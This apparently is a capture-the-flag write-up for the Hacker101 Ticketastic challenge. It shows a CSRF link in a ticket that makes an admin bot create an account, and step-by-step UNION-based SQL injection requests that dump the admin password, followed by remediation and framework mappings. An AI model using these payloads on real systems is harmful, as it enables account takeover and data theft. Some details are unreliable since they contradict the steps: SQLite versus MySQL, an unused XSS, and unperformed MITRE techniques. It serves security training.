# Ticketastic: Demo Instance: Writeup (2/2)

**Difficulty:** Moderate  
**Category:** Web (CSRF, SQL Injection)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF  
**Hint:** "This level and the Ticketastic live instance are running the same code"

---

## Challenge Overview

**Context:** A support ticket system with an admin panel. The "Demo" instance exposes default credentials that reveal the internal functionality, allowing you to understand how to exploit the "Live" instance running the same vulnerabilities.

**What you face:** A ticketing application where any user can create tickets, but only admins have full panel access. The code is identical to the Live Instance.

**Vulnerabilities exploited:**
- CSRF: `newUser` endpoint accepts GET requests without a CSRF token
- Stored XSS via links in tickets: admin clicks the malicious link
- SQL Injection on the `id` parameter of the `/ticket` endpoint

**What you learn:**
- How a "Demo" instance can be used to understand the logic before attacking the "Live" instance
- CSRF on user-creation endpoints via clickable links in tickets
- SQL Injection with UNION SELECT in SQLite to extract schema and data
- Difference between a demo instance (default credentials) and production

---

## Flag 0: CSRF via ticket link (user creation)

**Vulnerability:** The `newUser` endpoint accepts GET requests without CSRF validation, allowing creation of an admin user by convincing an admin to click a link.

### Step 1: Explore the Demo Instance

On the Demo instance, log in with `admin:admin` (default credentials) to understand the application. Note the existence of the endpoint:

```
GET /newUser?username=attacker&password=pass123&password2=pass123
```

### Step 2: Create a ticket with a malicious link

On the Live Instance (same vulnerabilities), create a ticket with a link pointing to the user creation endpoint:

```
Title: anything
Body:
<a href="http://localhost/newUser?username=attacker&password=pass123&password2=pass123">
  click here
</a>
```

### Step 3: Admin clicks the link

The admin bot that monitors tickets will click the link. The request is made by the admin (localhost), creating the account.

### Step 4: Log in with the new account

Log in with `attacker:pass123`. The flag appears in the new user's panel.

---

## Flag 1: SQL Injection on ticket ID

**Vulnerability:** The `id` parameter in `/ticket?id=N` is directly interpolated into the SQL query without parameterization.

### Step 1: Detect the injection

```
GET /ticket?id=1'
```
→ SQL error (MySQL syntax error)

```
GET /ticket?id=1 and 1=1
```
→ Works normally

### Step 2: Discover number of columns

```
GET /ticket?id=1 ORDER BY 1
GET /ticket?id=1 ORDER BY 2
GET /ticket?id=1 ORDER BY 3
GET /ticket?id=1 ORDER BY 4  ← error here = 3 columns
```

### Step 3: Enumerate tables

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--
```
Result: `tickets,users`

### Step 4: Enumerate columns in the users table

```
GET /ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
```
Result: `id,username,password`

### Step 5: Extract admin password (= flag)

```
GET /ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--
```
The response contains the flag (the password field *is* the flag).

---

## Attack Summary

```
FLAG 0: Demo (admin:admin) → understand newUser endpoint → ticket with CSRF link
        → admin clicks → account created → login → flag
FLAG 1: /ticket?id=1' → ORDER BY 3 → UNION SELECT tables → UNION SELECT password
        FROM users WHERE username='admin'-- → flag
```

---

## Demo vs Live Comparison

| Aspect | Demo | Live |
|--------|------|------|
| Admin login | `admin:admin` (obvious) | unknown (no direct access) |
| Vulnerabilities | same | same |
| CTF use | recon of `newUser` endpoint | flag targets |

The Demo instance is used to understand the endpoints before attacking the Live instance, which has no public registration link.

---

## Lessons Learned

1. **Demo instances** often expose functionality that reveals how to attack production
2. **CSRF on GET**: state-changing endpoints must never accept GET without a CSRF token
3. **Admin bots** that open user-submitted links are CSRF/XSS vectors
4. **SQL Injection with ORDER BY** to discover the number of columns is more reliable than blind UNION
5. **INFORMATION_SCHEMA** for schema enumeration, standard in MySQL/MariaDB

## Remediation

- Require CSRF tokens on all state-changing endpoints and reject GET for mutations
- Use parameterized queries (prepared statements) for all SQL operations
- Validate and sanitize user-submitted HTML in ticket bodies
- Never use default credentials in any environment; force password change on first login

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Persistence | Account Manipulation: Additional Cloud Credentials | T1098.001 |
| Credential Access | Brute Force: Password Spraying | T1110.003 |
| Collection | Data from Information Repositories | T1213 |
| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | T1550.004 |

---

## OWASP Top 10 2021

- **A01:2021 Broken Access Control**: CSRF on user creation endpoint allows unauthorized account creation
- **A03:2021 Injection**: SQL Injection via unparameterized `id` field in ticket queries
- **A07:2021 Identification and Authentication Failures**: default credentials on demo instance; no CSRF protection

## MITRE D3FEND Countermeasures

- **D3-SCA (Session Cookie Attribute)**: bind CSRF tokens to sessions; reject cross-origin state changes
- **D3-IPCF (IPC Filtering)**: validate and parameterize all database queries
- **D3-SPP (Strong Password Policy)**: eliminate default credentials in all environments

## NIST CSF 2.0

- **Protect (PR.AA)**: enforce CSRF validation on all authentication and account-management endpoints
- **Protect (PR.DS)**: use parameterized queries to prevent SQL injection
- **Detect (DE.CM)**: monitor for mass account creation or anomalous ticket content

## NIST SP 800-53 Rev. 5

- **SI-10 (Information Input Validation)**: parameterize SQL queries; validate ticket body content
- **AC-3 (Access Enforcement)**: require CSRF tokens on state-changing operations
- **IA-5 (Authenticator Management)**: prohibit default credentials; enforce strong password policies
- **AU-6 (Audit Record Review)**: log and review account creation events for anomalies

---

Thanks guys!! (❍ᴥ❍ʋ)

---

Demo instances are not playgrounds; they are blueprints. If this walkthrough on how CSRF and SQLi chain through a demo-to-live pipeline opened your eyes, share the lesson with your team.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
